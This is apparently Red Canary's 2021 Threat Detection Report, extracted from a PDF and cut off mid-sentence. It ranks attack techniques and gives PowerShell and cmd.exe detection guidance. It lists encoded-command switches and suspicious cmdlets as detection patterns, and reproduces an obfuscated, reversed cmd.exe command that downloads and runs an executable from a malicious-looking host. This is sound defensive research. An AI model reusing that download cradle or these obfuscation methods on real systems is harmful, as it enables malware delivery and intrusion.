# 2021 Threat Detection Report

## Table of Contents
- [Introduction](#introduction)
- [Methodology](#methodology)
- [Top Techniques](#top-techniques)
- [T1059 Command and Scripting Interpreter](#t1059-command-and-scripting-interpreter)
  - [T1059.001 PowerShell](#t1059001-powershell)
  - [T1059.003 Windows Command Shell](#t1059003-windows-command-shell)
- [T1218 Signed Binary Process Execution](#t1218-signed-binary-process-execution)
  - [T1218.011 Rundll32](#t1218011-rundll32)
  - [T1218.005 Mshta](#t1218005-mshta)
- [T1543 Create or Modify System Process](#t1543-create-or-modify-system-process)
  - [T1543.003 Windows Service](#t1543003-windows-service)
- [T1053 Scheduled Task/Job](#t1053-scheduled-taskjob)
  - [T1053.005 Scheduled Task](#t1053005-scheduled-task)
- [T1003 OS Credential Dumping](#t1003-os-credential-dumping)
  - [T1003.001 LSASS Memory](#t1003001-lsass-memory)
- [T1055 Process Injection](#t1055-process-injection)
- [T1027 Obfuscated Files or Information](#t1027-obfuscated-files-or-information)
- [T1105 Ingress Tool Transfer](#t1105-ingress-tool-transfer)
- [T1569 System Services](#t1569-system-services)
  - [T1569.002 Service Execution](#t1569002-service-execution)
- [T1036 Masquerading](#t1036-masquerading)
  - [T1036.003 Rename System Utilities](#t1036003-rename-system-utilities)
- [Top Threats](#top-threats)
- [TA551](#ta551)
- [Cobalt Strike](#cobalt-strike)
- [Qbot](#qbot)
- [IcedID](#icedid)
- [Mimikatz](#mimikatz)
- [Shlayer](#shlayer)
- [Dridex](#dridex)
- [Emotet](#emotet)
- [TrickBot](#trickbot)
- [Gamarue](#gamarue)
- [Other threats](#other-threats)

2021 Threat
Detection Report
2021 Threat Detection Report
T O P T E C H N I Q U E S
10
I N T R O D U C T I O N 3
M E T H O D O L O G Y 5
O T H E R T H R E AT S 119
T O P T H R E AT S 78
T A B L E O F C O N T E N T S
#1 T1059 Command and Scripting Interpreter 11
T1059.001 PowerShell 12
T1059.003 Windows Command Shell 16
#2 T1218 Signed Binary Process Execution 20
T1218.011 Rundll32 21
T1218.005 Mshta 26
#3 T1543 Create and Modify System Process 33
T1543.003 Windows Service 34
#4 T1053 Scheduled Task/Job 39
T1053.005 Scheduled Task 40
#5 T1003 OS Credential Dumping 47
T1003.001 LSASS Memory 48
#6 T1055 Process Injection 53
#7 T1027 Obfuscated Files or Information 58
#8 T1105 Ingress Tool Transfer 64
#9 T1569 System Services 69
T1569.002 Service Execution 70
#10 T1036 Masquerading 73
T1036.003 Rename System Utilities 74
#1 TA551 79
#2 Cobalt Strike 84
#3 Qbot 88
#4 IcedID 92
#5 Mimikatz 96
#6 Shlayer 100
#7 Dridex 103
#8 Emotet 107
#9 TrickBot 112
#10 Gamarue 115

3
Welcome to the 2021
Threat Detection Report

This in-depth look at the most prevalent ATT&CK® techniques is designed to help
you and your team focus on what matters most.

Getting started
Welcome to Red Canary’s 2021 Threat Detection Report. Based on in-depth
analysis of roughly 20,000 confirmed threats detected across our customers’
environments, this research arms security leaders and their teams with
actionable insight into the malicious activity and techniques we observe
most frequently.
Using the MITRE ATT&CK® framework as scaffolding, our analysis offers a bird’s
eye view of the malicious behaviors that you’re most likely to encounter—and
empowers you to address those threats head on with detailed detection
strategies that you can implement immediately. Whether you’re a CSO weighing
next year’s infosec budget, an intel analyst on the tails of a specific threat actor,
or an engineer looking to tune your detection logic, the Threat Detection Report
has insight for security professionals of all stripes.
How to use the report:
- Start perusing the most prevalent techniques and threats to see what we’ve
observed in our customers’ environments
- Explore how to detect and mitigate specific threats and techniques with
ideas and recommendations from our detection engineers, researchers,
and intelligence analysts
- Talk with your team about how the ideas, recommendations, and priorities
fit into your security controls and strategy
I N T R O D U C T I O N
INVESTIGATIVE LEADS
CONFIRMED THREATS
REPORT
14M
20K
1
2021 Threat Detection Report
l Introduction

4
2021 Threat Detection Report
More granular
analysis
MITRE ATT&CK’s adoption of
sub-techniques transformed the
overall structure of the report as
well as the scope of Red Canary’s
technique analysis.

Intel-fortified
Our Intelligence Team compiled the
top 10 most prevalent threats we
encountered in 2020, putting the top 10
techniques in context with malware and
other activity that leverages them.

The return of
the PDF
You asked, we listened! By popular
demand, this year’s report is available
not only in web format, but also in PDF
format so you can annotate it to your
heart’s content.
W H AT ’ S N E W I N 2 0 2 1
Acknowledgements

It takes an army to produce a research piece of this magnitude. Thanks to
the detection engineers, researchers, intelligence analysts, writers, editors,
designers, developers, and project managers who invested countless hours in
this report—and the operational work it’s derived from. And a huge thanks to
the MITRE ATT&CK team, whose framework has helped the community take a
giant leap forward in understanding and tracking adversary behaviors.
l Introduction

5
Methodology

Since 2013, Red Canary has delivered high-quality threat detection to
organizations of all sizes. Our platform collects hundreds of terabytes of
endpoint telemetry every day, surfacing evidence of threats that are analyzed
by our Cyber Incident Response Team (CIRT). Confirmed threats are tied to
corresponding MITRE ATT&CK® techniques to help our customers clearly
understand what is happening in their environments. This report is a summary
of confirmed threats derived from this data.
Creating metrics around techniques and threats is a challenge for any
organization. To help you better understand the data behind this report and
to serve as a guide for how you can create your own metrics, we want to share
some details about our methodology.
Behind the data
2021 Threat Detection Report

To understand our data, you need to understand how we detect malicious and
suspicious behavior in the first place. We gather telemetry from our customers’
endpoints and feed it through a constantly evolving library of detection
analytics. Each detection analytic is mapped to one or more ATT&CK techniques
and sub-techniques, as appropriate. When telemetry matches the logic in
one of our detection analytics, an event is generated for review by our
detection engineers.
l Methodology

6
2021 Threat Detection Report
When a detection engineer determines that one or more events for a specific
endpoint surpasses the threshold of suspicious or malicious behavior, a
confirmed threat detection documenting the activity is created for that
endpoint. These confirmed threat detections inherit the ATT&CK techniques
that were mapped to the analytics that alerted us to the malicious or suspicious
behaviors in the first place.
It’s important to understand that the techniques and sub-techniques we’re
counting are based on our analytics—and not on the review performed by our
detection engineers, during which they include more context into detections.
We’ve chosen this approach out of efficiency and consistency. However, the
limitation of this approach is that context gleaned during the investigation of a
threat does not contribute to its technique mapping, and, by extension, some
small percentage of threats may be mapped incorrectly or impartially. That said,
we continually review these confirmed threats, and we do not believe that there
are a significant number of mapping errors in our dataset.
Changes in ATT&CK

In 2020, MITRE released a version of ATT&CK that effectively added a new
dimension to the matrix, in the form of sub-techniques. We took this change as
an opportunity to comprehensively review the thousands of detection analytics
we’d created over the years. In addition to specifically realigning our analytics so
that they would map to sub-techniques, we were also able to standardize how
we mapped our analytics to ATT&CK in general. This sort of mapping may seem
straightforward, but it really isn’t. Over a period of years, we had many different
people interpreting the framework in many different ways. Naturally, this led to
a level of inconsistency that we wanted to fix. We implemented new guidelines
for mapping detection analytics to techniques and applied this to our entire
library.
We recommend that any organization mapping to ATT&CK (or any framework)
create a set of standard guidelines for analysts. While frameworks seem simple,
the choice of how to map information is a subjective human decision, and
guidelines help keep everyone aligned.
The changes we made in mapping our detection analytics resulted in a more
accurate representation of techniques being used. However, our remapping
effort to sub-techniques means that it is difficult to compare our 2021 Threat
Detection Report to last year’s report. While we realize this causes some
confusion, we believe updating to the latest ATT&CK version ensures a solid
foundation in the data underlying our report.

l Methodology

7
2021 Threat Detection Report
Okay, so how do you count?

Now that we’ve explained how we map to MITRE, you may be wondering how we
tally the scores for the Threat Detection Report. Our methodology for counting
technique prevalence has largely remained consistent since the original report
in 2019. For each malicious or suspicious detection we published during the
year, we incremented the count for each technique reflected by a detection
analytic that contributed to that detection. (We excluded data from detections
of unwanted software from these results.) If that detection was remediated,
and the host was reinfected at a later date, a new detection would be created,
thus incrementing the counts again. While this method of counting tends to
overemphasize techniques that get reused across multiple hosts in a single
environment (such as when a laterally moving adversary generates multiple
detections within a single environment), we feel this gives appropriate weight to
the techniques you are most likely to encounter as a defender.
For the purposes of this report, we decided to set our rankings based on
techniques, even though the majority of our analysis and detection guidance will
be based on sub-techniques. This seemed to be the most reasonable approach,
considering the following:
- Sometimes we map to a technique that doesn’t have sub-techniques
- Sometimes we map to sub-techniques
- Sometimes we map generally to a technique but not to its subs
We acknowledge the imperfection of this solution, but we also accept that this
is a transition year for both ATT&CK and Red Canary. In cases where a parent
technique has no subs or subs that we don’t map to, we will analyze the parent
technique on its own and provide detection guidance for it. However, in cases
where sub-technique detections are rampant for a given parent technique,
we will focus our analysis and detection guidance entirely on sub-techniques
that meet our requirements for minimum detection volume. To that point, we
decided to analyze sub-techniques that represented at least 20 percent of the
total detection volume for a given technique. If no sub-technique reached the 20
percent mark, then we analyzed the parent.
What about threats?

New to this year’s report is a ranking of the 10 most prevalent threats we
encountered in 2020. The Red Canary Intelligence Team seeks to provide
additional context about threats to help improve decision-making. By
understanding what threats are present in a detection, customers can better
understand how they should respond. Throughout 2020, the Intelligence Team
sought to improve how we identified and associated threats in detections. We
l Methodology

8
2021 Threat Detection Report
chose to define “threats” broadly as malware, threat groups, activity clusters,
or any other threat. We took two main approaches to associating a detection to
a threat: automatically associating them based on patterns identified for each
specific threat and manually associating them based on intelligence analyst
assessments conducted while reviewing each detection.
All that said, how did we tally the numbers for the most prevalent threats? In
contrast to our technique methodology, we counted threats by the unique
environments affected. Whereas for techniques we counted multiple detections
within the same customer environment as distinct tallies, for threats we
decided to only count by the number of customers who encountered that threat
during 2020. This is due to the heavy skew introduced by incident response
engagements for laterally moving threats that affect nearly every endpoint in an
environment (think ransomware).
Had we counted threats by individual detections, ransomware and the
laterally moving threats that lead up to it (e.g., Cobalt Strike) would have been
disproportionately represented in our data. We believe counting in this way
gives an appropriate measure of how likely each threat is to affect any given
organization, absent more specific threat modeling details for that organization.
It also serves as a check against the acknowledged bias in the way we count
technique prevalence.
Limitations

There are a few limitations to our methodology for counting threats, as there are
for any approach. Due to the nature of our visibility (i.e., that we predominantly
leverage endpoint detection and response data), our perspective tends to weigh
more heavily on threats that made it through the external defenses—such as
email and firewall gateways—and were able to gain some level of execution on
victim machines. As such, our results are likely different than what you may see
from other vendors focused more on network or email-based detection. For
example, though phishing is a generally common technique, it didn’t make it
into our top 10.
Another important limitation to our counting method may seem obvious: we
identify threats we already know about. As our nascent Intelligence Team began
in 2019, it wasn’t until mid-2020 that we began to thoroughly review all malicious
detections in earnest. And while we have built a considerable knowledge base
of intelligence profiles, the vast and ever-changing threat landscape presents
many unique threats that we are unable to associate (though in some cases we
have been able to cluster these under new monikers such as Blue Mockingbird
or Silver Sparrow). If we are able to identify a repeatable pattern for a certain
threat and automate its association, we observe the threat more often.
l Methodology

9
2021 Threat Detection Report
This means that while the top 10 threats are worth focusing on, they are
not the only threats that analysts should focus on, since there may be other
impactful ones that are unidentified and therefore underreported. Despite
these flaws, we believe that the analysis and detection guidance across the
threats and techniques in this report is reflective of the overall landscape, and,
if implemented, offers a great deal of defense-in-depth against the threats that
most organizations are likely to encounter.
Knowing the limitations of any methodology is important as you determine
what threats your team should focus on. While we hope our top 10 threats and
detection opportunities help prioritize threats to focus on, we recommend
building out your own threat model by comparing the top threats we share in
our report with what other teams publish and what you observe in your
own environment.
l Methodology

10
2021 Threat Detection Report
Top Techniques

The following chart illustrates the ranking of MITRE ATT&CK techniques
associated with confirmed threats across our customers’ environments. We
counted techniques by total threat volume, and the percentages below are a
measure of each technique’s share of overall detection volume. Since multiple
techniques can be mapped to any confirmed threat, the percentages below add
up to more than 100 percent.
1
6
2
7
3
8
4
9
5
10
T1059 Command
and Scripting Interpreter
T1218 Signed Binary
Process Execution
T1543 Create and
Modify System Process
T1027 Obfuscated Files
or Information
T1053 Scheduled Task / Job
T1003 OS Credential Dumping
T1055 Process Injection
T1105 Ingress Tool Transfer
T1569 System Services
T1036 Masquerading
24% of total threats
19%
16%
16%
7%
7%
6%
5%
4%
4%
l Top Techniques

11
Command and
Scripting Interpreter

Command and Scripting Interpreter tops our list this year thanks in large part to
detections associated with two of its sub-techniques: PowerShell and Windows
Command Shell.
T E C H N I Q U E T 1 0 5 9
OVERALL RANK
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
#1
72.2%
4,798
2021 Threat Detection Report
PowerShell
Windows Command Shell
T 1 0 5 9 . 0 0 1
T 1 0 5 9 . 0 0 3
PowerShell was the most common technique we observed in 2020,
affecting nearly half of our customers. It remains among the most
versatile of built-in utilities for adversaries, defenders, and system
administrators alike.
While it doesn’t do much on its own, Windows Command Shell can
call on virtually any executable on the system to execute batch files
and arbitrary tasks.
ORGANIZATIONS AFFECTED
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
CONFIRMED THREATS
48.7%
38.4%
2,366
1,984
S E E M O R E >
S E E M O R E >
T 1 0 5 9 : C O M M A N D A N D S C R I P T I N G
“Adversaries may abuse command and script interpreters to execute commands,
scripts, or binaries. These interfaces and languages provide ways of interacting with
computer systems and are a common feature across many different platforms. Most
systems come with some built-in command-line interface and scripting capabilities,
for example, macOS and Linux distributions include some flavor of Unix Shell while
Windows installations include the Windows Command Shell and PowerShell.”
P R E V A L E N T S U B -T E C H N I Q U E S
11 l T1059: Command and Scripting Interpreter

12
PowerShell

PowerShell was the most common technique we observed in 2020, affecting
nearly half of our customers. It remains among the most versatile of built-in
utilities for adversaries, defenders, and system administrators alike.
Analysis
Why do adversaries use PowerShell?

PowerShell is a versatile and flexible automation and configuration
management framework built on top of the .NET Common Language Runtime
(CLR), which expands its capabilities beyond other common command-line and
scripting languages. PowerShell is included by default in modern versions of
Windows.
Adversaries use PowerShell to obfuscate commands in hopes of achieving any of
the following:
- evading detection
- spawning additional processes
- downloading and executing remote code and binaries
- gathering information
- changing system configuration
Adversaries rely on PowerShell’s versatility and ubiquitous presence on target
systems, minimizing the need to additionally customize payloads.
How do adversaries use PowerShell?

While PowerShell offers adversaries a plethora of options, the most common
uses include:
- executing commands
- leveraging encoded commands
- obfuscation (with and without encoding)
- downloading additional payloads
- launching additional processes
T E C H N I Q U E T 1 0 5 9 . 0 0 1
PARENT TECHNIQUE RANK
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
#1
48.7%
2,366
2021 Threat Detection Report
l T1059.001: PowerShell

13
PowerShell is frequently observed in phishing campaigns, where emails with
weaponized attachments containing embedded code launch a payload. In many
cases, such as with Emotet, this payload executes encoded and obfuscated
PowerShell commands that download and execute additional code or a
malicious binary from a remote resource.
We encounter encoding or obfuscation more than any other variety of malicious
or suspicious PowerShell. PowerShell’s flexibility—along with its support for
aliases, abbreviated cmdlets, argument names, and calling .NET methods—
offers attackers many ways to invoke Base64 and other encoding. Below is a
case-agnostic review of the methods we commonly observe in rank order, with
approximate percentages representing their frequency of occurrence in our
detections:
- 27%: -e
- 25%: -ec
- 21%: -encodecommand
- 15%: [System.Convert]::FromBase64String()
- 6%: -encoded
- 4%: -enc
- 1%: -en
- .4%: -encod
- .01%: -enco
- < .01%: -encodedco, -encodedc, -en^c
Given PowerShell’s support for shortened command-line arguments,
escape characters in the command line, and more, do not consider the above
list comprehensive.
Emerging Windows Command
Shell tradecraft
While leveraging PowerShell, adversaries have been known to use format
string obfuscation (i.e., the dynamic building of strings by using non-standard
sequences of format string operators like {0} and {1}) instead of Base64 encoding.
We’ve also encountered different mechanisms to obfuscate commands and
payloads; these not only leverage common characters for obfuscation (such as ^
or +), but also variables that are broken up initially to help evade detection and
then concatenated back together for execution.
2021 Threat Detection Report
T 1 0 5 9 . 0 0 1 :
P O W E R S H E L L
“Adversaries may abuse PowerShell
commands and scripts for execution.
PowerShell is a powerful interactive
command-line interface and scripting
environment included in the Windows
operating system. Adversaries can
use PowerShell to perform a number
of actions, including discovery of
information and execution of code.
Examples include the Start-Process
cmdlet which can be used to run an
executable and the Invoke-Command
cmdlet which runs a command locally
or on a remote computer (though
administrator permissions are required
to use PowerShell to connect to
remote systems).”
l T1059.001: PowerShell

14
Detection
Collection requirements
Process and command-line monitoring

Command-line parameters are by far the most efficacious for detecting
potentially malicious PowerShell behavior, at least as far as standard process
telemetry is concerned. Logs such as Anti-Malware Scan Interface (AMSI), script-
block, or Sysmon can be particularly helpful for detecting PowerShell.
Detection opportunities
Encoding command switch

Encoding and obfuscation tend to go together. Watch for the execution
of powershell.exe with command lines that include variations of the
-encodecommand argument; PowerShell will recognize and accept anything
from -e onward, and it will show up outside of the encoded bits. The following
are example variations on the shortened, encoded command switch:
- -e
- -ec
- -encodecommand
- -encoded
- -enc
- -en
- -encod
- -enco
This is a starting point, so be prepared for some initial noise as you implement
and tune this detection logic.
Base64 encoding

Base64 encoding isn’t inherently suspicious, but it’s worth looking out for in a
lot of environments. As such, looking for the execution of a process that seems
to be powershell.exe along with a corresponding command line containing the
term base64 is a good way to detect a wide variety of malicious activity. Beyond
alerting on PowerShell that leverages Base64 encoding, consider leveraging
a tool—like CyberChef, for example—that is capable of decoding encoded
commands.
2021 Threat Detection Report
l T1059.001: PowerShell

15
2021 Threat Detection Report
D E T E C T I O N
S T R AT E G I S T
Frank is responsible for building and
maintaining the Red Canary CIRT
training program. He leads all aspects
including onboarding new employees
and fostering the development of
new or expanding skillsets. Frank
is an accomplished cyber security
investigator and information assurance
practitioner with deep experience in
digital forensics and incident response
(DFIR). He paid his dues in DFIR
consulting before going on to manage
security operations for a national
financial services firm, where he built
and led the team responsible for
continuous monitoring, threat analysis,
and incident response.
Frank McClain
C I R T
T R A I N I N G L E A D
Obfuscation

Once decoded (from Base64), you may encounter compressed code, more
Base64 blobs, and decimal, ordinal, and obfuscated commands. Obfuscation
(whether inside or outside the encoding) breaks up detection methodologies by
splitting commands or parameters, inserting extra characters (that are ignored
by PowerShell), and other janky behavior. You can use regular expressions (such
as regex) to increase fidelity and help flag more interesting activity from within
the decoded sections. Monitoring for the execution of PowerShell with unusually
high counts of characters like ^, +, $, and % may help you detect suspicious and
malicious behavior.
Suspicious cmdlets

Once the command line is decoded to human-readable text, you can also watch
for various cmdlets, methods, and switches that may indicate malicious activity.
These may include strings such as Invoke-Expression (or variants like iex and
.invoke), the DownloadString or DownloadFile methods, or unusual switches like
-nop or -noni.
Weeding out false positives

Monitoring for encoded commands may seem like an easy win, and it is certainly
a place to start. However, you will quickly find that many platforms and
administrators leverage PowerShell and use encoded commands as a part of
normal workflows. As such, flagging activity simply based on variations of the
-encodedcommand switch may generate a significant amount of noise. Start
with queries against offline or static data to get a feel for volume.
Once you have a better understanding of your overall volume, identify patterns
within the decoded data. Leverage your knowledge of what is normal for your
environment in order to identify what is potentially malicious. Automation is
critical to not just detecting encoded commands, but the contents of those
commands once decoded. Prior to applying detection logic, feed encoded
command lines into a workflow that decodes them; that way, you are increasing
fidelity from the start.
l T1059.001: PowerShell

16
Windows Command Shell

While it doesn’t do much on its own, Windows Command Shell can call
on virtually any executable on the system to execute batch files and
arbitrary tasks.
Analysis
Why do adversaries use Windows
Command Shell?

Windows Command Shell is ubiquitous across all versions of Windows and,
unlike its more sophisticated and capable cousin, PowerShell, the Windows
Command Shell takes no dependencies on specific versions of .NET. While
Command Shell’s native capabilities are limited, they have been stable for years,
maybe even decades. Adversaries know that if cmd.exe works in their lab, it’s
going to work in the field.
The Windows Command Shell is the no-frills field general in an adversary’s
arsenal. It may not be able to do much on its own, but it is capable of calling on
virtually any executable on the system to carry out its mission.
Because Command Shell can execute batch files, adversaries can use it to
reliably and repeatedly execute arbitrary tasks.
How do adversaries use Windows
Command Shell?

In a review of more than 1,000 confirmed threat detections, we found cmd.exe
called more than 6,000 times in more than 4,000 unique command lines across
hundreds of customer environments. PowerShell was a child process of cmd
in more than 480 instances. We saw more than 350 references to unique batch
files and 270 unique scheduled tasks calling cmd across more than 30 customer
environments.
One of the most commonly observed techniques is the use of cmd to call native
commands and redirect the output of those commands to a file on the local
admin share, for example:
T E C H N I Q U E T 1 0 5 9 . 0 0 3
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
#1
38.4%
1,984
2021 Threat Detection Report
l T1059.003: Windows Command Shell
PARENT TECHNIQUE RANK

17
This technique is consistent with Impacket, an open source tool that adversaries
use to manipulate networking protocols. We observed similar patterns of
execution and output redirection nearly 400 times across more than a dozen
customer environments.
Emerging Windows Command
Shell tradecraft
Windows Command Shell was originally released in 1987 and, though it has new
user-interface features in Windows 10, it has a relatively limited set of built-in
commands—commands that may be invoked without starting a new process
on the system. This old dog isn’t really doing new tricks. In the last quarter of
2020, we observed 11 detections for cmd.exe replacing utilman.exe enabling
authentication bypass. The only Windows Command Shell detections with
higher frequency counts in that quarter involved suspected red team activity
and similar internal testing tools.
Having said that, if there is anything novel involving cmd.exe, it may be
obfuscation. In the spring of 2018, Daniel Bohannon released a whitepaper on
DOS obfuscation techniques and a framework called Invoke-DOSfucation for
creating obfuscated DOS command lines that could be used to evade simple,
signature-based detections and slow down human analysis. In our data set of
more than 1,000 detections involving the Windows Command Shell, we found 91
unique command lines involving some measure of obfuscation. The most heavily
obfuscated DOS command we observed was similar to the one shown here:
2021 Threat Detection Report
l T1059.003: Windows Command Shell

18
In the Windows Command Shell, the caret (^) character is an escape character.
When it precedes special characters, like the pipe (|) character or file redirection
operators (<>), those special characters will be treated as normal characters.
When the caret symbol precedes non-special characters, nothing special
happens; it is effectively ignored. So the command above becomes:
Looking at this command carefully, we can see it sets a variable named N1 to
a string containing a PowerShell command that is reversed. There’s a For loop
that reverses this string and executes it. The PowerShell command creates a
download cradle to download a file and invokes it via a call to Invoke-Item.
While these obfuscated commands may evade simple, signature-based
detections, analytics that look for commonly used obfuscation techniques, such
as the presence of caret characters, can easily detect them. Layered detection
analytics will also help. If a detection misses the obfuscated DOS commands,
another detection may trigger on the PowerShell download cradle, the call to
Invoke-Item, or a DNS lookup to an unusual domain.
Detection
Collection requirements
Process and command-line monitoring

Windows Security Event Logs—specifically Process Creation (ID 4688) events
with command-line argument logging enabled—will be the best source of
observing and detecting malicious usage of the Windows Command Shell.
Having a good understanding of baseline scripts and processes that call the
Windows Command Shell is essential to reducing noise and combating potential
false positive alerts.
2021 Threat Detection Report
cmd /V/C”set N1= }
}{hctac};kaerb;iB$ metI-
ekovnI;
)iB$ ,dq$(eliFdaolnwoD.cAB${yrt{)tlm$ ni
dq$(hcaerof;’exe.’
+Kjm$+’\’
+cilbup:vne$=iB$;’963’
= Kjm$;
)’@’
(tilpS.’detcefni=l?php.suoici/lam/
niamod.live/
/
:ptth’=tlm$;tneilCbeW.teN tcejbo-
wen=cAB$ llehsrewop&&for /L %R in (265;-1;0)do
set ZR=!ZR!
!N1:~%R,1!&&if %R==0 call %ZR:*ZR!=%
T 1 0 5 9 . 0 0 3 :
W I N D O W S
C O M M A N D S H E L L
“Adversaries may abuse the Windows
command shell for execution. The
Windows command shell (cmd.exe)
is the primary command prompt
on Windows systems. The Windows
command prompt can be used to
control almost any aspect of a system,
with various permission levels required
for different subsets of commands.”
l T1059.003: Windows Command Shell

19
Detection requirements
Focus on the uncommon patterns of execution and patterns of execution
commonly associated with malice. If you’re trying to detect various flavors of
obfuscation, consider monitoring for the following:
Consider stripping the following characters from your command line before
applying your detection logic: ( “ ) ^
Though cmd.exe itself is fairly limited in its capabilities, it has many tools it can
call into the fight. Having a good understanding of those tools is essential to
detecting malicious use of Windows Command Shell.
Weeding out false positives
Unfortunately, the best data source for detecting malicious use of the Windows
Command Shell—Process Creation events with command-line arguments
captured (Event ID 4688 in the Windows Security Event log)—will also be the
primary source of false positives. Understanding your environment and how
Windows Command Shell is normally used will help you separate the wheat from
the chaff. Create filters to bucket normal usage, unusual usage, and suspicious
or known malicious usage to build a successful detection pipeline that doesn’t
over